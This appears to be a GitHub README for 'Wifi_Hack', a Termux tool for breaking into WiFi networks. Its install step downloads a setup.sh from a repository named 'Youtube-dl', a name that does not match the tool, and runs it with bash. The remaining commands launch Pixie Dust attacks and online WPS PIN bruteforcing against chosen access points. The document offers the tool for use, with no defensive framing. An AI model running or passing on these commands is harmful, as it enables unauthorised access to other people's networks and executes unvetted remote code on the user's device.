## Wifi_Hack
### Hack WIfi Using Termux! (Requires Root)

<p align="center"><img src="https://i.ibb.co/K74g0SC/hulu.jpg"></p>

### Installation :

```
pkg install wget -y
```
```
wget https://raw.githubusercontent.com/n1s4t/Youtube-dl/master/setup.sh
```
```
bash setup.sh
```

#### Example : `sudo python birihack.py -i wlan0 -K`

#### Note: 
**First turn off your Wifi.**
- Show avaliable networks and start Pixie Dust attack on a specified network.
- `sudo python birihack.py -i wlan0 -K`
- - Start Pixie Dust attack on a specified BSSID:
`sudo python birihack.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
- Launch online WPS bruteforce with the specified first half of the PIN:
- `sudo python birihack.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234`
### Troubleshooting
**"Device or resource busy (-16)" - Turn on Wifi and Then Turn off Wifi.**
